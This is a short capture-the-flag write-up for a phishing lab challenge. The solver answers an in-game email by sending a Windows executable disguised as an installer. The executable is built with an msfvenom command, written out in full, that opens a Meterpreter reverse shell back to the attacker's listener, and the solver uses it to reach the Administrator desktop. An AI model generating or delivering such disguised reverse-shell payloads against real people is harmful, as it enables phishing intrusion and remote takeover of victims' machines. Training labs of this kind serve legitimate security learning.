# Shadow Phishing 
## Challenge 
We gained access to the email account of ShadowByte, one of Cipher's trusted operatives. 
This breakthrough will help bring Cipher's location closer to light and foil his plans for the apocalyptic cyber weapon. 
The clock is ticking, though too much time and Cipher will know something is wrong and again disappear into the depths of the darknet. The race against time goes on. 

__Username:__ shadowbyte@darknetmail.corp

__Password:__ ShadowIsTheBest

## Solution
When accessing the ShadowByte email we see this email from Cipher:

![image](https://github.com/user-attachments/assets/3ec7adcc-512f-4f04-b05f-43cdeebb20db)

Cipher told ShadowByte that he needs a exe! Like Ghost Phishing challenge, we could create a reverse TCP shell windows executable. For this we used metasploit for a faster and easy way to create this.

We used this command to generate our executable named silentEdgeInstaller.exe to match what Cipher wanted:

```bash
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.23.56.134 LPORT=8080 -f exe -o /home/thm/silentEdgeInstaller.exe
```
After we went to the msfconsole and created our payload and started listenning for incoming connections.
![image](https://github.com/user-attachments/assets/4dc51052-19ab-43cd-b06e-9f1ee0cd2ce4)
![image](https://github.com/user-attachments/assets/7477ad2f-1bb9-42c2-a13b-b27e16c2afde)

After this we sent the executable to Cipher, replying to the email he sent. He didnt responded but we got the connection.

![image](https://github.com/user-attachments/assets/5b418768-d8c7-4390-bacc-81cf93496857)

They want the Administrator flag. So we went to the Administrator desktop and found the flag!

![Untitled design](https://github.com/user-attachments/assets/2ea79b8d-509a-4db2-88af-c6d8b2c938af)
